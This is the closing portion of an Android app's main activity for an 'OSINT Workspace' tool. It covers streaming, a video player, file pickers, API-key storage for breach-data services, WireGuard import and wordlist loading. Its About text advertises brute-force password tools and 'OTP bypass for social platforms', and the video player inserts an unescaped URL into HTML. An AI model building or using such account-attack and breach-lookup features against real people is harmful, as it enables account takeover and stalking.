                        case 2: url = "https://www.youtube.com/live"; break;
                        case 3: url = "https://kick.com"; break;
                        case 4: url = "https://rumble.com"; break;
                        default: url = "https://www.twitch.tv";
                    }
                    web.loadUrl(url);
                    web.setVisibility(View.VISIBLE);
                }).show();
    }

    // ==================== VIDEO PLAYER ====================
    private void showVideoPlayer() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Enter Video URL");
        final EditText input = new EditText(this);
        input.setText(inUrl.getText().toString().trim());
        input.setHint("https://example.com/video.mp4");
        builder.setView(input);
        builder.setPositiveButton("Play", (d, w) -> {
            String url = input.getText().toString().trim();
            if (!url.isEmpty()) {
                // Play video in WebView using HTML5 video tag
                String html = "<html><body style='margin:0;background:#000;'>" +
                        "<video width='100%' height='100%' controls autoplay>" +
                        "<source src='" + url + "' type='video/mp4'>" +
                        "Your browser doesn't support video.</video></body></html>";
                web.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null);
                web.setVisibility(View.VISIBLE);
                status.setText("Playing video");
            }
        });
        builder.setNegativeButton("Cancel", null);
        builder.show();
    }

    // ==================== FILE BROWSER ====================
    private void browseFiles() {
        Intent pick = new Intent(Intent.ACTION_OPEN_DOCUMENT);
        pick.addCategory(Intent.CATEGORY_OPENABLE);
        pick.setType("*/*");
        startActivityForResult(pick, FILE_PICK_REQUEST);
    }

    private void browsePhotos() {
        Intent pick = new Intent(Intent.ACTION_PICK, MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
        startActivityForResult(pick, IMAGE_PICK_REQUEST);
    }

    private void browseDocs() {
        Intent pick = new Intent(Intent.ACTION_OPEN_DOCUMENT);
        pick.addCategory(Intent.CATEGORY_OPENABLE);
        pick.setType("application/msword");
        startActivityForResult(pick, FILE_PICK_REQUEST + 1);
    }

    private void browsePdfs() {
        Intent pick = new Intent(Intent.ACTION_OPEN_DOCUMENT);
        pick.addCategory(Intent.CATEGORY_OPENABLE);
        pick.setType("application/pdf");
        startActivityForResult(pick, FILE_PICK_REQUEST + 2);
    }

    // ==================== SETTINGS ====================
    private void showSettings() {
        String[] options = {"Set API Keys", "About", "Check for Updates", "Clear Cache", "Reset All Settings"};
        new AlertDialog.Builder(this).setTitle("Settings")
                .setItems(options, (d, w) -> {
                    switch (w) {
                        case 0: showApiKeyManager(); break;
                        case 1: showAbout(); break;
                        case 2: checkForUpdates(); break;
                        case 3: web.clearCache(true); status.setText("Cache cleared"); break;
                        case 4: getSharedPreferences(PREFS, MODE_PRIVATE).edit().clear().apply(); status.setText("Settings reset"); break;
                    }
                }).show();
    }

    private void showApiKeyManager() {
        String[] apis = {"HPB API Key", "Leaks.io API Key", "DeHashed API Key", "EmailRep API Key"};
        new AlertDialog.Builder(this).setTitle("API Keys")
                .setItems(apis, (d, w) -> {
                    switch (w) {
                        case 0: promptHpbApiKey(); break;
                        case 1: promptLeaksIoKey(); break;
                        case 2: promptGenericApiKey("dehashed_key", "DeHashed API Key"); break;
                        case 3: promptGenericApiKey("emailrep_key", "EmailRep API Key"); break;
                    }
                }).show();
    }

    private void promptGenericApiKey(String prefKey, String title) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle(title);
        final EditText input = new EditText(this);
        String existing = getSharedPreferences(PREFS, MODE_PRIVATE).getString(prefKey, "");
        input.setText(existing);
        input.setHint("Enter API key");
        builder.setView(input);
        builder.setPositiveButton("Save", (d, w) -> {
            getSharedPreferences(PREFS, MODE_PRIVATE).edit().putString(prefKey, input.getText().toString().trim()).apply();
            status.setText(title + " saved");
        });
        builder.setNegativeButton("Cancel", null);
        builder.show();
    }

    private void showAbout() {
        new AlertDialog.Builder(this)
                .setTitle("OSINT Workspace v2.0")
                .setMessage("All-in-one OSINT tool\n\n" +
                        "Features:\n" +
                        "â€¢ Multi-engine search (Google, Bing, DDG, etc.)\n" +
                        "â€¢ Tor dark web browsing\n" +
                        "â€¢ VPN management (WireGuard)\n" +
                        "â€¢ Reverse image & face search\n" +
                        "â€¢ Leaks search (social, cloud, email, etc.)\n" +
                        "â€¢ Porn/cams/escort search\n" +
                        "â€¢ Google dork generator\n" +
                        "â€¢ HPB & Leaks.io API integration\n" +
                        "â€¢ Brute force & password tools\n" +
                        "â€¢ OTP bypass for social platforms\n" +
                        "â€¢ Live streaming & video player\n" +
                        "â€¢ File/photo/doc browser\n\n" +
                        "Built with â¤ï¸ for OSINT investigations")
                .setPositiveButton("OK", null)
                .show();
    }

    // ==================== HELPERS ====================
    private void loadSavedApiKeys() {
        hpbApiKey = getSharedPreferences(PREFS, MODE_PRIVATE).getString("hpb_key", "");
        leaksIoApiKey = getSharedPreferences(PREFS, MODE_PRIVATE).getString("leaksio_key", "");
    }

    private void restoreSelections() {
        restoreSelection("social_selection", selectedSocial);
        restoreSelection("content_selection", selectedContent);
    }

    private void restoreSelection(String key, boolean[] target) {
        String val = getSharedPreferences(PREFS, MODE_PRIVATE).getString(key, "");
        if (val.isEmpty()) return;
        for (String s : val.split(",")) {
            try { int i = Integer.parseInt(s); if (i >= 0 && i < target.length) target[i] = true; }
            catch (NumberFormatException ignored) {}
        }
    }

    private void checkForUpdates() {
        AppUpdater.check(this, "osint-master.apk", status);
    }

    private void checkPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_EXTERNAL_STORAGE, android.Manifest.permission.WRITE_EXTERNAL_STORAGE}, PERMISSION_STORAGE);
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int code, @NonNull String[] perms, @NonNull int[] results) {
        super.onRequestPermissionsResult(code, perms, results);
        if (code == PERMISSION_STORAGE && results.length > 0 && results[0] == PackageManager.PERMISSION_GRANTED) {
            status.setText("Storage permission granted");
        }
    }

    private void clearInputs() {
        inQuery.setText("");
        inDomain.setText("");
        inUrl.setText("");
        inFilePath.setText("");
        status.setText("Cleared");
    }

    private void openExternal(String url, String msg) {
        try {
            startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
            status.setText(msg);
        } catch (Exception e) {
            status.setText("Could not open URL");
        }
    }

    private String readStream(InputStream is) throws IOException {
        BufferedReader br = new BufferedReader(new InputStreamReader(is));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = br.readLine()) != null) sb.append(line).append('\n');
        br.close();
        return sb.toString();
    }

    private String escapeHtml(String s) {
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;");
    }

    // ==================== ACTIVITY RESULT ====================
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (resultCode != RESULT_OK || data == null || data.getData() == null) return;

        Uri uri = data.getData();
        if (requestCode == VPN_CONFIG_REQUEST) {
            try {
                String config;
                try (InputStream is = getContentResolver().openInputStream(uri);
                     ByteArrayOutputStream baos = new ByteArrayOutputStream()) {
                    if (is == null) throw new IOException("Cannot read file");
                    byte[] buf = new byte[4096]; int n;
                    while ((n = is.read(buf)) != -1) baos.write(buf, 0, n);
                    config = baos.toString("UTF-8");
                }
                if (!config.contains("[Interface]") || !config.contains("[Peer]")) {
                    status.setText("Not a valid WireGuard config");
                    return;
                }
                // Save URI for quick connect
                getSharedPreferences(PREFS, MODE_PRIVATE).edit().putString("wg_config_uri", uri.toString()).apply();
                Intent open = new Intent(Intent.ACTION_VIEW);
                open.setDataAndType(uri, "application/x-wireguard-profile");
                open.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                startActivity(Intent.createChooser(open, "Import into WireGuard"));
                status.setText("WireGuard config imported");
            } catch (Exception e) {
                status.setText("Error importing config: " + e.getMessage());
                new AlertDialog.Builder(this).setTitle("WireGuard required")
                        .setMessage("Install WireGuard from Play Store")
                        .setPositiveButton("Install", (d, w) -> installWireguard())
                        .setNegativeButton("Cancel", null).show();
            }
        } else if (requestCode == FILE_PICK_REQUEST) {
            // Save wordlist path
            String path = uri.getPath();
            getSharedPreferences(PREFS, MODE_PRIVATE).edit().putString("wordlist_path", path).apply();
            status.setText("Wordlist loaded: " + path);
        } else if (requestCode == IMAGE_PICK_REQUEST || requestCode == IMAGE_PICK_REQUEST + 1) {
            // Reverse image search
            String imageUrl = uri.toString();
            web.loadUrl("https://www.google.com/searchbyimage?image_url=" + urlEncode(imageUrl));
            web.setVisibility(View.VISIBLE);
            status.setText("Reverse image search...");
        }
    }

    // ==================== BACK PRESS ====================
    @Override
    public void onBackPressed() {
        if (drawer.isDrawerOpen(Gravity.START)) {
            drawer.closeDrawer(Gravity.START);
        } else if (web.canGoBack()) {
            web.goBack();
        } else {
            super.onBackPressed();
        }
    }

    // ==================== DESTROY ====================
    @Override
    protected void onDestroy() {
        if (torProcess != null) {
            torProcess.destroy();
            torProcess = null;
        }
        if (bruteExecutor != null) bruteExecutor.shutdownNow();
        super.onDestroy();
    }
}
